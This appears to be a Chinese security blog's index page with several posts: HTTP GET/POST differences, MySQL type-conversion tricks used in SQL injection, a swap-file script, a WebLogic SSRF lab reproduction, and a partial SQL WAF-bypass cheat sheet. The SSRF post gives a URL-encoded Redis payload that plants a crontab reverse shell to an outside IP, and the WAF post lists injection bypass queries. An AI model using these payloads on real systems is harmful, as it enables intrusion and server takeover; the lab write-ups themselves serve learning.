<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-tw">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="Jaychouzzk's blogs" type="application/atom+xml">






<meta name="keywords" content="safe blogs">
<meta property="og:type" content="website">
<meta property="og:title" content="Jaychouzzk&#39;s blogs">
<meta property="og:url" content="https://jaychouzzk.github.io/index.html">
<meta property="og:site_name" content="Jaychouzzk&#39;s blogs">
<meta property="og:locale" content="zh-tw">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Jaychouzzk&#39;s blogs">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://jaychouzzk.github.io/">





  <title>Jaychouzzk's blogs</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-tw">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Jaychouzzk's blogs</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/03/26/HTTP POST GET 本质区别详解/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/HTTP POST GET 本质区别详解/" itemprop="url">HTTP POST GET 本质区别详解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-03-26T03:38:28+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>参考链接：<br><a href="https://sunshinevvv.coding.me/blog/2017/02/09/HttpGETv.s.POST/" target="_blank" rel="noopener">HTTP协议中GET和POST方法的区别</a><br><a href="https://blog.csdn.net/gideal_wang/article/details/4316691" target="_blank" rel="noopener">HTTP POST GET 本质区别详解</a></p>
</blockquote>
<p>#一.原理区别</p>
<p>一般再浏览器中输入网址访问资源都是通过<code>GET</code>方式;在<code>FORM</code>表单中提交数据，可以通过<code>METHOD</code>指定方式进行提交，默认为<code>GET</code>请求提交，还可以设置为<code>POST</code>请求进行提交</p>
<p>HTTP定义了与服务器交互的不同方法，最基本的方法有四种:<code>GET,POST,PUT,DELETE</code></p>
<p>分别对应着<code>查，改，增，删</code>,四个操作，一般<code>GET</code>用于获取查询资源信息，<code>POST</code>一般用于更新资源信息</p>
<p>根据HTTP规范，<code>GET用于信息的获取，而且应该是安全的、幂等的</code></p>
<p>1.所谓的安全，是意味着<code>GET</code>操作是用于获取信息而非修改信息。<code>GET</code>请求一般不应该产生副作用，仅仅是资源的获取，不会修改，增加数据，不会影响资源的状态<br>2.幂等：    是一个数学或计算机学概念，常用于抽象代数。<br>        对于单目运算，如果一个运算对于范围内所有的一个数进行多次该运算，返回的结果和进行一次该运算的结果一致，那么该运算被称之为幂等，比如绝对值运算就是一个幂等运算<br>        对于双目运算，则要求当参与运算的两个值是等值的情况下，满足结果与参与运算的两个值相等，则该运算称之为运算幂等，如两个相等的数取最大值，该运算则为幂等运算</p>
<pre><code>但在实际应用中，以上2条规定并没有这么严格。引用别人文章的例子：比如，新闻站点的头版不断更新。虽然第二次请求会返回不同的一批新闻，该操 作仍然被认为是安全的和幂等的，因为它总是返回当前的新闻。从根本上说，如果目标是当用户打开一个链接时，他可以确信从自身的角度来看没有改变资源即可。
</code></pre><p>根据HTTP规范，<code>POST</code>表示可能修改服务器上的资源请求。继续引用上面的例子：还是新闻以网站为例，读者对新闻发表自己的评论应该通过POST实现，因为在评论提交后站点的资源已经不同了，或者说资源被修改了。</p>
<p><strong>问题的由来：</strong></p>
<p>1.很多人贪方便，更新资源时用了GET，因为用POST必须要到FORM（表单），这样会麻烦一点。</p>
<p>2.对资源的增，删，改，查操作，其实都可以通过GET/POST完成，不需要用到PUT和DELETE。</p>
<p>3.另外一个是，早期的但是Web MVC框架设计者们并没有有意识地将URL当作抽象的资源来看待和设计 。还有一个较为严重的问题是传统的Web MVC框架基本上都只支持GET和POST两种HTTP方法，而不支持PUT和DELETE方法。</p>
<p> 　　* 简单解释一下MVC：MVC本来是存在于Desktop程序中的，M是指数据模型，V是指用户界面，C则是控制器。使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。</p>
<p>　　以上3点典型地描述了老一套的风格（没有严格遵守HTTP规范），随着架构的发展，现在出现REST(Representational State Transfer)，一套支持HTTP规范的新风格，这里不多说了，可以参考《RESTful Web Services》。</p>
<p>#二、表现形式的区别</p>
<p>HTTP请求的格式如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;request line&gt;</span><br><span class="line">&lt;headers&gt;</span><br><span class="line">&lt;blank line&gt;</span><br><span class="line">&lt;request-body&gt;</span><br></pre></td></tr></table></figure>
<p>在HTTP请求中，第一行必须为<code>&lt;request line&gt;</code>,用来说明请求类型、访问的资源、以及使用的HTTP版本，紧接着是HTTP请求头部,用来说明服务器要使用的附加信息。之后是一个空行，在此之后可以添加任意的其他数据</p>
<p><code>GET</code>请求</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /xxx/?xxx=xxx&amp;xxx=xxx HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.xxx.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure>
<p><code>POST</code>请求</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.xxx.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 40</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"></span><br><span class="line">xxx=xxx&amp;xxx=xxx</span><br></pre></td></tr></table></figure>
<p>显而易见，<code>GET</code>请求的数据是包含在URL中的，而<code>POST</code>请求时包含在HTTP Body中的</p>
<p>#三、对长度的限制</p>
<p>对于传输数据的大小限制<br>    1.首先，HTTP协议中并没有对这两种的传输数据大小做限制，也没有对URL的长度做限制，只有大多数浏览器或者服务器对URL的长度进行了长度限制，如IE的长度限制为2048个字符,火狐浏览器则为10w个字符。<br>    2.理论上，<code>POST</code>请求不是通过URL传值，是不受数据大小限制的，但是，各个WEB服务器会规定对<code>POST</code>请求传输的数据进行不同的大小限制</p>
<p>#四、安全性</p>
<p>在HTTP协议中，<code>GET</code>请求为什么会比<code>POST</code>请求安全呢？</p>
<p>1.这里的安全是指，一个方法的语义在本质上是只读的，不会引起服务端任何的状态变化，就是安全的无害的，而<code>POST</code>请求会去更新修改服务器端的资源，所以<code>GET</code>请求会比<code>POST</code>请求要安全。由此可得，HEAD, OPTIONS 和 TRACE 这几个方法也是安全的。</p>
<p>2.幂等,<code>GET</code>请求时幂等的，多次进行该请求和仅执行一次的结果完全相同，便是安全的，但是HTTP规范中是安全的，服务端是否能过做到幂等，这个是无法确保的。</p>
<p>仅仅是在HTTP协议中来看<code>GET</code>请求确实比<code>POST</code>请求要更加安全</p>
<p>如果是在实际应用来看的话，可见与不可见，<code>POST</code>请求还是比<code>GET</code>请求来的安全些，如：密码的传输、敏感信息的传输等等</p>
<p>#五、实际应用的区别</p>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:center">GET</th>
<th style="text-align:center">POST</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">后退按钮/刷新</td>
<td style="text-align:center">无害</td>
<td style="text-align:center">数据会被重新提交（浏览器应该告知用户数据会被重新提交）</td>
</tr>
<tr>
<td style="text-align:center">书签</td>
<td style="text-align:center">可收藏为书签</td>
<td style="text-align:center">不可收藏为书签</td>
</tr>
<tr>
<td style="text-align:center">缓存</td>
<td style="text-align:center">能被缓存</td>
<td style="text-align:center">不能缓存</td>
</tr>
<tr>
<td style="text-align:center">编码类型</td>
<td style="text-align:center">application/x-www-form-urlencoded</td>
<td style="text-align:center">application/x-www-form-urlencoded 或 multipart/form-data。为二进制数据使用多重编码。</td>
</tr>
<tr>
<td style="text-align:center">历史</td>
<td style="text-align:center">参数保留在浏览器历史中</td>
<td style="text-align:center">参数不会保存在浏览器历史中</td>
</tr>
<tr>
<td style="text-align:center">对数据类型的限制</td>
<td style="text-align:center">只允许 ASCII 字符</td>
<td style="text-align:center">没有限制。也允许二进制数据</td>
</tr>
<tr>
<td style="text-align:center">安全性</td>
<td style="text-align:center">与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分。在发送密码或其他敏感信息时绝不要使用 GET</td>
<td style="text-align:center">POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中</td>
</tr>
<tr>
<td style="text-align:center">可见性</td>
<td style="text-align:center">数据在 URL 中对所有人都是可见的</td>
<td style="text-align:center">数据不会显示在 URL 中</td>
</tr>
<tr>
<td style="text-align:center">对数据长度的限制</td>
<td style="text-align:center">是由浏览器和服务端来进行约束的</td>
</tr>
</tbody>
</table>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/03/24/mysql的隐式类型转换/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/24/mysql的隐式类型转换/" itemprop="url">mysql的隐式类型转换</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-03-24T02:28:55+08:00">
                2019-03-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在小密圈中看到了一个这个问题，忽然发现自己好像也不晓得mysql数据库中有这种特性，遂记录一下</p>
<p>有位老哥提出了这样的问题，查询的时候出现了一个问题，where=1时，如图，只出现id=1的数据;当where=’1’=’’;时查询到除了id=1以外的数据。</p>
<p><img src="/img/mysql-类型转换-1.png" alt=""></p>
<p>下面有几位师傅解答了一下，<code>where id=&#39;1&#39;=&#39;&#39;</code>=<code>where (id=&#39;1&#39;)=&#39;&#39;</code>，过程应该是，mysql在进行字符串与数字比较时，字符串会被mysql隐式类型转换为浮点数，所以这里<code>&#39;&#39;</code>被转换为了<code>0</code>，最后就是<code>(id=1)=0</code>,输出结果即为id不为1的结果。</p>
<p>在Freebuf中也看到了类似的操作<a href="https://www.freebuf.com/articles/web/190019.html" target="_blank" rel="noopener">SQL注入常规Fuzz全记录</a></p>
<p><code>select * from user where name=&#39;admin&#39;+1+&#39;&#39; and passwd=&#39;123456&#39;;(为false) ==&gt;提示用户名错误</code></p>
<p><code>select * from user where name=&#39;admin&#39;+0+&#39;&#39; and passwd=&#39;123456&#39;;(为true) ==&gt;提示密码错误</code></p>
<p>于是自己测试了一下,发现了神奇的结果，在进行字符串和数字运算的时候，mysql也会进行隐式类型转换,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;admin&apos;=&apos;admin&apos;+&apos;1&apos;;</span><br><span class="line">+---------------------+</span><br><span class="line">| &apos;admin&apos;=&apos;admin&apos;+&apos;1&apos; |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   0 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set, 2 warnings (0.00 sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;admin&apos;=&apos;admin&apos;+&apos;a&apos;;</span><br><span class="line">+---------------------+</span><br><span class="line">| &apos;admin&apos;=&apos;admin&apos;+&apos;a&apos; |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   1 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set, 3 warnings (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>隐式类型转换规则:</p>
<p>·如果一个或两个参数都是NULL，比较的结果是NULL，除了NULL安全的&lt;=&gt;相等比较运算符。对于NULL &lt;=&gt; NULL，结果为true。不需要转换<br>·如果比较操作中的两个参数都是字符串，则将它们作为字符串进行比较。<br>·如果两个参数都是整数，则将它们作为整数进行比较。<br>·如果不与数字进行比较，则将十六进制值视为二进制字符串<br>·如果其中一个参数是十进制值，则比较取决于另一个参数。 如果另一个参数是十进制或整数值，则将参数与十进制值进行比较，如果另一个参数是浮点值，则将参数与浮点值进行比较<br>·如果其中一个参数是TIMESTAMP或DATETIME列，另一个参数是常量，则在执行比较之前将常量转换为时间戳。<br>·在所有其他情况下，参数都是作为浮点数（实数）比较的。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/03/21/Vultr增加虚拟内存/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/21/Vultr增加虚拟内存/" itemprop="url">Linux增加虚拟内存</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-03-21T15:09:02+08:00">
                2019-03-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>有的KVM的VPS初始给的SWAP太小了，比如DigitalOcean就没有分配SWAP，Bandwagon给的才132MB的SWAP，所以需要自行增加SWAP文件。</p>
<p><code>vim swap.sh</code></p>
<p>按i键，开启插入模式，插入以下文字。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">echo -e "\033[33m Your current swap is \033[0m"</span><br><span class="line">free -h</span><br><span class="line">mkdir /SwapDir</span><br><span class="line">cd /SwapDir</span><br><span class="line">dd if=/dev/zero of=/SwapDir/swap bs=1M count=512 #这里增加的空间是512MB  </span><br><span class="line">chmod 0600 swap  </span><br><span class="line">mkswap /SwapDir/swap #把这个分区变成swap分区 </span><br><span class="line">swapon /SwapDir/swap #把刚建的swap分区设成为有效状态  </span><br><span class="line">myFile=/etc/fstab.bak   </span><br><span class="line">cd /etc  </span><br><span class="line">if [ -f "$myFile" ];then</span><br><span class="line">rm -rf fstab.bak #删除之前的备份 </span><br><span class="line">else  </span><br><span class="line">cp /etc/fstab /etc/fstab.bak #备份fstab  </span><br><span class="line">fi  </span><br><span class="line">echo "/SwapDir/swap swap swap defaults 0 0"&gt;&gt;/etc/fstab #增加新的swap开机自动启动  </span><br><span class="line">echo -e "\033[31m Done\!Congratulation\！System swap add successful\！ \033[0m"  </span><br><span class="line">echo -e "\033[33m Your system swap is \: \033[0m"</span><br><span class="line">free -h</span><br></pre></td></tr></table></figure>
<p>Esc，再输入“:wq”，保存退出。</p>
<p>运行这个脚本，</p>
<p><code>sh swap.sh</code></p>
<p>即可增加一个512MB的SWAP文件。文件大小可以自行在脚本中修改，不过一般512MB也足够了。</p>
<p>转自:<a href="https://www.ljchen.com/archives/1345" target="_blank" rel="noopener">一键增加VPS虚拟内存SWAP</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/02/24/weblogic SSRF漏洞复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/24/weblogic SSRF漏洞复现/" itemprop="url">weblogic SSRF漏洞复现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-02-24T19:24:14+08:00">
                2019-02-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这里使用vuhub中的weblogic SSRF漏洞环境</p>
<p>环境下载地址为：</p>
<pre><code>https://vulhub.org/
</code></pre><p>打开链接<strong><a href="http://192.168.11.137:7001/uddiexplorer/" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/</a></strong>，可以发现此页面</p>
<p><img src="/img/weblogic -SSRF-1.png" alt=""></p>
<p>访问页面<strong>Search Public Registries</strong>，发现是用来搜索的页面</p>
<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp</a></strong></p>
<p><img src="/img/weblogic -SSRF-2.png" alt=""></p>
<p>访问页面<strong>Search Private Registry</strong>，发现需要用户登录才可以进行操作</p>
<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPrivateRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPrivateRegistries.jsp</a></strong></p>
<p><img src="/img/weblogic -SSRF-3.png" alt=""></p>
<p>访问页面<strong>Publish Private Registry</strong>，发现也需要用户登录才可以进行操作</p>
<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/PublishToPrivateRegistry.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/PublishToPrivateRegistry.jsp</a></strong></p>
<p><img src="/img/weblogic -SSRF-4.png" alt=""></p>
<p>访问页面<strong>Modify Private Registry</strong>，发现也需要用户登录才可以进行操作</p>
<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/ModifyRegistry.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/ModifyRegistry.jsp</a></strong></p>
<p><img src="/img/weblogic -SSRF-5.png" alt=""></p>
<p>访问页面<strong>Setup UDDI Explorer</strong>，发现有一处可以输入url，可以尝试进行ssrf攻击</p>
<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SetupUDDIExplorer.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SetupUDDIExplorer.jsp</a></strong></p>
<p><img src="/img/weblogic -SSRF-6.png" alt=""></p>
<p>漏洞测试：<br>输入<a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a> ，在使用burpsuite抓下包，查看下数据包，可以看到，Response包中的状态码为302，应该是不存在ssrf漏洞</p>
<p><img src="/img/weblogic -SSRF-7.png" alt=""></p>
<p>尝试在<strong>Search Public Registries</strong>页面输入，发现返回了一个错误</p>
<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp</a></strong></p>
<p><img src="/img/weblogic -SSRF-8.png" alt=""></p>
<p>使用burpsuit查看下数据包内容，发现此处的url好像是可以控制的</p>
<p><img src="/img/weblogic -SSRF-9.png" alt=""></p>
<p>将端口改为一个存在的端口再继续查看返回结果，可以看到，返回404</p>
<p><img src="/img/weblogic -SSRF-10.png" alt=""></p>
<p>将端口改为一个不存在的端口再继续查看返回结果，可以看到，返回not connect</p>
<p><img src="/img/weblogic -SSRF-11.png" alt=""></p>
<p>尝试使用dict等协议尝试进行端口扫描，会返回不识别此协议</p>
<p><img src="/img/weblogic -SSRF-12.png" alt=""></p>
<p>在虚拟机中使用docker inspect 98f9e676d014 命令来查看内网中redis服务的ip，ip为172.21.0.2</p>
<p><img src="/img/weblogic -SSRF-13.png" alt=""></p>
<p>尝试探测内网redis服务，探测成功</p>
<p><img src="/img/weblogic -SSRF-14.png" alt=""></p>
<p>尝试进行反弹shell，将以下代码进行url编码</p>
<pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot; 
config set dir /etc/ 
config set dbfilename crontab 
save
</code></pre><p>得到payload：</p>
<pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F207.148.101.58%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
</code></pre><p><img src="/img/weblogic -SSRF-15.png" alt=""></p>
<p>成功反弹shell</p>
<p><img src="/img/weblogic -SSRF-16.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/01/20/总结：waf绕过技巧-sql，不完整版待补充/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/20/总结：waf绕过技巧-sql，不完整版待补充/" itemprop="url">总结：waf绕过技巧-sql，不完整版待补充</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-01-20T13:14:25+08:00">
                2019-01-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>一、注释</p>
<pre><code>代替注释的符号：

#
--
//
/*letmetest*/
;
</code></pre><hr>
<pre><code>可以用来代替空格的：

--+-
-- -
/**/    
/*！*/    

/*!union*/    可以用来代替union两边的空格
mysql&gt; select * from stu where id=.1/*!union*/(select@,(select name from`stu`limit 1,1));
+------+------+
| id   | name |
+------+------+
| NULL | ss   |
+------+------+
1 row in set (0.02 sec)
</code></pre><hr>
<p>二、特殊用法</p>
<pre><code>科学记数法：

mysql&gt; select * from stu where id=1e0union(select(2),(select(name)from(stu)limit 1,1));
+------+------+
| id   | name |
+------+------+
|    1 | zs   |
|    1 | aaa  |
|    2 | ss   |
+------+------+
3 rows in set (0.00 sec)

一些特殊符号用法：
(1)    +

